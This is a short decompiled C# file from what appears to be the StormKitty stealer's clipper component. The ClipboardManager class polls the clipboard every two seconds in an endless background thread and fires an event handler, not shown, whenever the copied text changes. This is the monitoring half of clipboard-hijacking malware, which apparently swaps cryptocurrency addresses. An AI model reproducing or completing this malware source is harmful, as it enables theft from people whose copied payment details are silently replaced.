using System;
using System.Threading;
using Clipper;

namespace StormKitty
{
	// Token: 0x0200004D RID: 77
	internal sealed class ClipboardManager
	{
		// Token: 0x0600013F RID: 319 RVA: 0x0000B3A9 File Offset: 0x000095A9
		private static void Run()
		{
			for (;;)
			{
				Thread.Sleep(2000);
				ClipboardManager.ClipboardText = Clipboard.GetText();
				if (ClipboardManager.ClipboardText != ClipboardManager.PrevClipboard)
				{
					ClipboardManager.PrevClipboard = ClipboardManager.ClipboardText;
					EventManager.Action();
				}
			}
		}

		// Token: 0x0400008A RID: 138
		public static string PrevClipboard = "";

		// Token: 0x0400008B RID: 139
		public static string ClipboardText;

		// Token: 0x0400008C RID: 140
		public static Thread MainThread = new Thread(new ThreadStart(ClipboardManager.Run));
	}
}
